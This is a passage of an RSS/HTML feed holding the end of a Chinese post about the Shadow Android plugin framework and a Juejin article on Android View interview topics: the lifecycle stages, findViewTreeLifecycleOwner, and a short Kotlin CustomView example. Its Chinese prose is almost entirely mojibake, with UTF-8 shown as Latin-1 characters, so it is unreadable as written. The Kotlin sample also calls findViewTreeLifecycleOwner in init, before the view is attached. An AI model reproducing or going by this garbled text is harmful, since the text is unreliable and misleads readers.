<p>åœ¨AndroidåŠ¨æ€åŒ–æŠ€æœ¯ç»å†äº†"é‡è›®ç”Ÿé•¿"çš„Hookæ—¶ä»£åï¼ŒShadowä»£è¡¨çš„æ˜¯ä¸€ç§<strong>ç†æ€§å›å½’</strong>â€”â€”å°Šé‡ç³»ç»Ÿè®¾è®¡ã€éµå¾ªå¹³å°è§„èŒƒã€è¿½æ±‚é•¿æœŸç¨³å®šã€‚è¿™æˆ–è®¸æ­£æ˜¯å®ƒè¢«ç§°ä¸º"ç»ˆææ–¹æ¡ˆ"çš„çœŸæ­£åŸå› ï¼šä¸æ˜¯å› ä¸ºå®ƒåŠŸèƒ½æœ€å¼ºï¼Œè€Œæ˜¯å› ä¸ºå®ƒæœ€å¯æŒç»­ã€‚</p>
<p>å¯¹äºé¢ä¸´æ¨¡å—åŒ–ã€åŠ¨æ€åŒ–éœ€æ±‚çš„ä¸­å¤§å‹Androidåº”ç”¨æ¥è¯´ï¼ŒShadowä¸ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯æ¡†æ¶ï¼Œæ›´æ˜¯ä¸€ç§æ¶æ„ç†å¿µçš„å®è·µã€‚åœ¨åˆè§„æ€§è¦æ±‚æ—¥ç›Šä¸¥æ ¼çš„ä»Šå¤©ï¼Œé€‰æ‹©Shadowæ„å‘³ç€é€‰æ‹©äº†<strong>æŠ€æœ¯å€ºåŠ¡æœ€ä½ã€é•¿æœŸé£é™©æœ€å°</strong>çš„è·¯å¾„ã€‚</p>
<blockquote>
<p>æŠ€æœ¯çš„ç»ˆæä»·å€¼ä¸æ˜¯çªç ´é™åˆ¶ï¼Œè€Œæ˜¯åœ¨é™åˆ¶ä¸­åˆ›é€ å¯èƒ½ã€‚Shadowæ­£æ˜¯è¿™ä¸€ç†å¿µåœ¨Androidæ’ä»¶åŒ–é¢†åŸŸçš„æœ€ä½³å®è·µã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¿…é¡»è¦ææ‡‚çš„ View æ ¸å¿ƒé—®é¢˜]]></title>    <link>https://juejin.cn/post/7595053284915085352</link>    <guid>https://juejin.cn/post/7595053284915085352</guid>    <pubDate>2026-01-15T00:17:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595053284915085352" data-draft-id="7593713738856955942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¿…é¡»è¦ææ‡‚çš„ View æ ¸å¿ƒé—®é¢˜"/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2026-01-15T00:17:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¿…é¡»è¦ææ‡‚çš„ View æ ¸å¿ƒé—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:17:11.000Z" title="Thu Jan 15 2026 00:17:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><em>æœ¬ç³»åˆ—ä¸ºå°è¯´ã€Šé€†è¢­è¥¿äºŒæ——ã€‹çš„æŠ€æœ¯è®²è§£ï¼Œç”¨äºè¯¦ç»†è¯´æ˜<a href="https://juejin.cn/post/7594310266410893312" target="_blank" title="https://juejin.cn/post/7594310266410893312">å‰§æƒ…</a>é‡Œæ¶‰åŠçš„å¼€å‘ç»†èŠ‚ã€‚</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e107d5c382ef4ddf87ff38742ef025f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041031&amp;x-signature=UpChYpFAmrIUvDpkaqMhqbQCAWM%3D" alt="0.png" loading="lazy"/></p>
<p>Android UI æ˜¯å¼€å‘çš„æ ¸å¿ƒï¼Œæä¾›äº†è®¾è®¡å±å¹•ã€å¸ƒå±€ã€æ§ä»¶ç­‰ç»„ä»¶çš„å·¥å…·ï¼Œæ„æˆåº”ç”¨çš„ç»“æ„ä¸äº¤äº’æ–¹å¼ã€‚å°½ç®¡å¼€å‘çš„å…¶ä»–æ–¹é¢ä¹Ÿå¾ˆé‡è¦ï¼Œä½† UI ç³»ç»Ÿå®šä¹‰äº†ç”¨æˆ·çš„ç¬¬ä¸€å°è±¡ï¼Œæ˜¯æ‰“é€ ç¾è§‚ã€å“åº”è¿…é€Ÿåº”ç”¨çš„å…³é”®ã€‚</p>
<p>å¦‚ä»Š <strong>Jetpack Compose</strong> ç”Ÿæ€å‘å±•è¿…é€Ÿï¼Œå·²å¹¿æ³›ç”¨äºç”Ÿäº§ç¯å¢ƒçš„ Android UI å¼€å‘ï¼Œå ªç§° Android UI çš„æœªæ¥ã€‚æ–°æ‰‹ç”šè‡³å¯ä»¥ç›´æ¥ä» <strong>Jetpack Compose</strong> å…¥æ‰‹ï¼Œå†æ…¢æ…¢äº†è§£ä¼ ç»Ÿè§†å›¾ç³»ç»Ÿã€‚</p>
<p>ç„¶è€Œï¼Œéƒ¨åˆ†å¤§å‹ä¼ä¸šä»é‡åº¦ä¾èµ–ä¼ ç»Ÿ <code>View</code> ç³»ç»Ÿï¼ˆè¿ç§»åˆ° <strong>Compose</strong> å­˜åœ¨æŒ‘æˆ˜ï¼‰ã€‚è‹¥ä½ è¦é¢è¯•è¿™ç±»ä¼ä¸šï¼Œæ‰å®æŒæ¡ä¼ ç»Ÿ <code>View</code> ç³»ç»Ÿä¾ç„¶å¿…è¦ã€‚</p>
<p>åœ¨ Android <code>View</code> ä¸­ï¼Œç†è§£ <code>View</code> çš„ç”Ÿå‘½å‘¨æœŸå’Œå¸¸ç”¨ UI ç»„ä»¶æ˜¯æ„å»ºé«˜æ€§èƒ½åº”ç”¨çš„å…³é”®â€”â€”å› ä¸ºæ‰€æœ‰ UI å…ƒç´ é»˜è®¤è¿è¡Œåœ¨ä¸»çº¿ç¨‹ã€‚æ­¤å¤–ï¼Œç†è§£ Android UI ç³»ç»Ÿçš„æ ¸å¿ƒåŸåˆ™ï¼ˆå¦‚çª—å£ã€å°ºå¯¸å•ä½ï¼‰ï¼Œèƒ½å¸®åŠ©å¼€å‘è€…åšå‡ºåˆç†çš„åº”ç”¨æ„å»ºå†³ç­–ã€‚</p>
<p>å¾ˆå¤šåœºæ™¯ä¸‹ï¼Œä¸ºäº†æ»¡è¶³è®¾è®¡å›¢é˜Ÿçš„å¤æ‚éœ€æ±‚ï¼Œå¿…é¡»è‡ªå®šä¹‰ <code>View</code>ã€‚å› æ­¤ï¼Œæ·±å…¥ç†è§£ Android UI ç³»ç»Ÿæ˜¯é«˜æ•ˆå¼€å‘çš„å…³é”®æŠ€èƒ½ï¼Œä¹Ÿæ˜¯æˆä¸ºä¼˜ç§€ Android å¼€å‘è€…çš„å¿…ç»ä¹‹è·¯ã€‚</p>
<h2 data-id="heading-0">View çš„ç”Ÿå‘½å‘¨æœŸ</h2>
<p>åœ¨ Android ä¸­ï¼Œ<code>View</code> ç”Ÿå‘½å‘¨æœŸæŒ‡ <code>View</code> ï¼ˆå¦‚<code>TextView</code>ã€<code>Button</code>ï¼‰ä»åˆ›å»ºã€ç»‘å®šåˆ°<code>Activity</code>/<code>Fragment</code>ã€æ˜¾ç¤ºåœ¨å±å¹•ï¼Œå†åˆ°æœ€ç»ˆé”€æ¯/è§£ç»‘çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ç†è§£ <code>View</code> ç”Ÿå‘½å‘¨æœŸæœ‰åŠ©äºå¼€å‘è€…ç®¡ç† <code>View</code> çš„åˆå§‹åŒ–ã€æ¸²æŸ“ã€é”€æ¯ï¼Œä»¥åŠåœ¨åˆé€‚æ—¶æœºé‡Šæ”¾èµ„æºã€‚</p>
<h3 data-id="heading-1">é¢è¯•é—®é¢˜</h3>
<p>è‹¥è¦åˆ›å»ºä¸€ä¸ªéœ€æ‰§è¡Œé«˜å¼€é”€åˆå§‹åŒ–ï¼ˆå¦‚åŠ è½½å›¾ç‰‡ã€è®¾ç½®åŠ¨ç”»ï¼‰çš„è‡ªå®šä¹‰ <code>View</code> ï¼Œåº”åœ¨ <code>View</code> ç”Ÿå‘½å‘¨æœŸçš„å“ªä¸ªé˜¶æ®µåˆå§‹åŒ–è¿™äº›èµ„æºï¼Ÿå¦‚ä½•ç¡®ä¿èµ„æºè¢«æ­£ç¡®é‡Šæ”¾ä»¥é¿å…å†…å­˜æ³„æ¼ï¼Ÿ</p>
<p>åº”ç”¨å­˜åœ¨å¤æ‚ UIï¼ŒåŠ¨æ€åˆ›å»ºçš„ <code>View</code> å‡ºç°æ€§èƒ½é—®é¢˜æ—¶ï¼Œå¦‚ä½•ä¼˜åŒ– <code>onMeasure()</code> å’Œ <code>onLayout()</code> æ–¹æ³•ï¼Œåœ¨ä¿è¯å“åº”æ€§çš„åŒæ—¶æå‡æ¸²æŸ“æ•ˆç‡ï¼Ÿ</p>
<h3 data-id="heading-2">å›¾è§£ç”Ÿå‘½å‘¨æœŸ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04ad0c54ce4740a58cc51bd1e96d2caa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041031&amp;x-signature=eMMEyKku4rd5WbG51WFCeSKPqP4%3D" alt="1.png" loading="lazy"/></p>
<ol>
<li><strong>Viewåˆ›å»ºï¼ˆonAttachedToWindowï¼‰</strong>ï¼š <code>View</code> è¢«å®ä¾‹åŒ–çš„é˜¶æ®µï¼ˆé€šè¿‡ä»£ç åˆ›å»ºæˆ–åŠ è½½ <code>XML</code> å¸ƒå±€ï¼‰ã€‚åœ¨æ­¤é˜¶æ®µéœ€å®Œæˆåˆå§‹è®¾ç½®ï¼Œå¦‚ç»‘å®šç›‘å¬å™¨ã€å¤„ç†æ•°æ®ï¼›å½“ <code>View</code> è¢«æ·»åŠ åˆ°çˆ¶å®¹å™¨å¹¶å‡†å¤‡æ¸²æŸ“æ—¶ï¼Œ<code>onAttachedToWindow()</code> æ–¹æ³•ä¼šè¢«è§¦å‘ã€‚</li>
<li><strong>å¸ƒå±€é˜¶æ®µï¼ˆonMeasureã€onLayoutï¼‰</strong>ï¼šæ ¸å¿ƒæ˜¯è®¡ç®— <code>View</code> çš„å°ºå¯¸å’Œä½ç½®ã€‚<code>onMeasure()</code> æ–¹æ³•ä¼šæ ¹æ®å¸ƒå±€å‚æ•°å’Œçˆ¶å®¹å™¨çº¦æŸï¼Œç¡®å®š <code>View</code> çš„å®½é«˜ï¼›æµ‹é‡å®Œæˆåï¼Œ<code>onLayout()</code> æ–¹æ³•è¿›ä¸€æ­¥ç¡®å®š <code>View</code> åœ¨çˆ¶å®¹å™¨ä¸­çš„å…·ä½“ä½ç½®ï¼Œæœ€ç»ˆæ˜ç¡®å…¶åœ¨å±å¹•ä¸Šçš„æ˜¾ç¤ºåŒºåŸŸã€‚</li>
<li><strong>ç»˜åˆ¶é˜¶æ®µï¼ˆonDrawï¼‰</strong>ï¼šå½“ <code>View</code> çš„å°ºå¯¸å’Œä½ç½®ç¡®å®šåï¼Œ<code>onDraw()</code> æ–¹æ³•ä¼šå°† <code>View</code> çš„å†…å®¹ï¼ˆå¦‚æ–‡æœ¬ã€å›¾ç‰‡ï¼‰æ¸²æŸ“åˆ° <code>Canvas</code> ä¸Šã€‚è‡ªå®šä¹‰ <code>View</code> æ—¶ï¼Œå¯é‡å†™æ­¤æ–¹æ³•å®ç°ä¸ªæ€§åŒ–ç»˜åˆ¶é€»è¾‘ã€‚</li>
<li><strong>äº‹ä»¶å¤„ç†ï¼ˆonTouchEventã€onClickï¼‰</strong>ï¼šå¯¹äºäº¤äº’å¼ <code>View</code> ï¼ˆå¦‚<code>Button</code>ï¼‰ï¼Œæ­¤é˜¶æ®µè´Ÿè´£å¤„ç†è§¦æ‘¸ã€ç‚¹å‡»ç­‰ç”¨æˆ·è¾“å…¥äº‹ä»¶ã€‚é€šè¿‡è¿™äº›æ–¹æ³•å®šä¹‰ <code>View</code> çš„å“åº”é€»è¾‘ï¼Œå®ç°ä¸ç”¨æˆ·çš„äº¤äº’ã€‚</li>
<li><strong>Viewè§£ç»‘ï¼ˆonDetachedFromWindowï¼‰</strong>ï¼šå½“ <code>View</code> ä»å±å¹•å’Œçˆ¶å®¹å™¨ï¼ˆå¦‚ <code>Activity</code>/<code>Fragment</code> é”€æ¯ï¼‰ä¸­ç§»é™¤æ—¶ï¼Œ<code>onDetachedFromWindow()</code> æ–¹æ³•ä¼šè¢«è§¦å‘ã€‚æ­¤é˜¶æ®µéœ€é‡ç‚¹æ¸…ç†èµ„æºï¼Œå¦‚æ³¨é”€ç›‘å¬å™¨ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</li>
<li><strong>Viewé”€æ¯</strong>ï¼šå½“ <code>View</code> ä¸å†è¢«ä½¿ç”¨æ—¶ï¼Œä¼šè¢«ç³»ç»Ÿåƒåœ¾å›æ”¶ã€‚å¼€å‘è€…éœ€ç¡®ä¿é‡Šæ”¾æ‰€æœ‰å…³è”èµ„æºï¼ˆå¦‚äº‹ä»¶ç›‘å¬å™¨ã€åå°ä»»åŠ¡ï¼‰ï¼Œä»¥ä¼˜åŒ–æ€§èƒ½å¹¶æœç»å†…å­˜æ³„æ¼é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-3">æ€»ç»“</h3>
<p><code>View</code> çš„ç”Ÿå‘½å‘¨æœŸæ¶µç›–åˆ›å»ºã€æµ‹é‡ã€å¸ƒå±€ã€ç»˜åˆ¶ã€äº‹ä»¶å¤„ç†ã€è§£ç»‘ç­‰å…³é”®é˜¶æ®µï¼Œå®Œæ•´è¦†ç›–äº† <code>View</code> åœ¨åº”ç”¨ä¸­çš„æ˜¾ç¤ºä¸ä½¿ç”¨å…¨è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-4">è¿›é˜¶ï¼šfindViewTreeLifecycleOwner</h3>
<p><code>findViewTreeLifecycleOwner()</code> ä¼šéå† <code>View</code> æ ‘å±‚çº§ï¼ŒæŸ¥æ‰¾å¹¶è¿”å›æœ€è¿‘çš„ <code>LifecycleOwner</code>ï¼ˆé€šå¸¸æ˜¯ <code>Activity</code>ã€<code>Fragment</code> æˆ–å®ç°äº† <code>LifecycleOwner</code> æ¥å£çš„è‡ªå®šä¹‰ç»„ä»¶ï¼‰ï¼›è‹¥æœªæ‰¾åˆ°åŒ¹é…çš„ <code>LifecycleOwner</code>ï¼Œåˆ™è¿”å› <code>null</code>ã€‚</p>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆä½¿ç”¨å®ƒ</h3>
<p>è¯¥æ–¹æ³•åœ¨è‡ªå®šä¹‰ <code>View</code> æˆ–ç¬¬ä¸‰æ–¹ç»„ä»¶ä¸­æå…·å®ç”¨æ€§â€”â€”è¿™ç±»ç»„ä»¶å¾€å¾€éœ€è¦ä¸ <code>LifecycleObserver</code>ã€<code>LiveData</code> ç­‰ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹å…ƒç´ äº¤äº’ï¼Œä½†åˆæ— éœ€æ˜¾å¼ä¾èµ–å®¿ä¸» <code>Activity</code>/<code>Fragment</code>ã€‚é€šè¿‡å®ƒï¼Œ <code>View</code> èƒ½ä¾¿æ·è®¿é—®å®¿ä¸»çš„ç”Ÿå‘½å‘¨æœŸï¼Œå…·ä½“ä¼˜åŠ¿å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç¡®ä¿ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹ç»„ä»¶ä¸æ­£ç¡®çš„ç”Ÿå‘½å‘¨æœŸç»‘å®šï¼›</li>
<li>ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨æ¸…ç†è§‚å¯Ÿè€…ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ <code>View</code> ç»‘å®š <code>LifecycleObserver</code> çš„ä¾‹å­</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomView</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
) : View(context, attrs, defStyleAttr) {
    <span class="hljs-keyword">init</span> {
        <span class="hljs-keyword">val</span> observer = <span class="hljs-keyword">object</span> : LifecycleObserver {
            <span class="hljs-comment">// æ ¸å¿ƒé€»è¾‘</span>
        }
        <span class="hljs-keyword">val</span> lifecycleOwner = findViewTreeLifecycleOwner()
        lifecycleOwner?.lifecycle?.addObserver(observer) ?: run {
            Log.d(<span class="hljs-string">"CustomView"</span>, <span class="hljs-string">"æœªæ‰¾åˆ°å½“å‰Viewå¯¹åº”çš„LifecycleOwner"</span>)
        }
    }
}
</code></pre>
<p>æ­¤ç¤ºä¾‹ä¸­ï¼Œè‡ªå®šä¹‰ <code>CustomView</code> ä¼šåŠ¨æ€ç»‘å®š <code>View</code> æ ‘ä¸­æœ€è¿‘çš„ <code>LifecycleOwner</code>ï¼Œç¡®ä¿<code>LifecycleObserver</code> ä¸åˆé€‚çš„ç”Ÿå‘½å‘¨æœŸå…³è”ï¼Œä¿éšœèµ„æºçš„åˆç†ç®¡ç†ã€‚</p>
<h3 data-id="heading-6">å…³é”®ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li><strong>è‡ªå®šä¹‰View</strong>ï¼šè®©è‡ªå®šä¹‰ <code>View</code> ä¸­çš„ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹ç»„ä»¶èƒ½å¤Ÿè§‚å¯Ÿç”Ÿå‘½å‘¨æœŸå˜åŒ–ï¼Œç²¾å‡†ç®¡ç†èµ„æºï¼›</li>
<li><strong>ç¬¬ä¸‰æ–¹åº“</strong>ï¼šä½¿ç¬¬ä¸‰æ–¹ UI ç»„ä»¶æ— éœ€æ˜¾å¼ä¾èµ–ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå³å¯ä¸ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥å‹èµ„æºäº¤äº’ï¼›</li>
<li><strong>è§£è€¦é€»è¾‘</strong>ï¼šè®© <code>View</code> è‡ªä¸»æŸ¥æ‰¾ <code>View</code> æ ‘ä¸­çš„ <code>LifecycleOwner</code>ï¼Œå‡å°‘ <code>View</code> ä¸å®¿ä¸»ç»„ä»¶çš„è€¦åˆåº¦ï¼Œæå‡ä»£ç çµæ´»æ€§ã€‚</li>
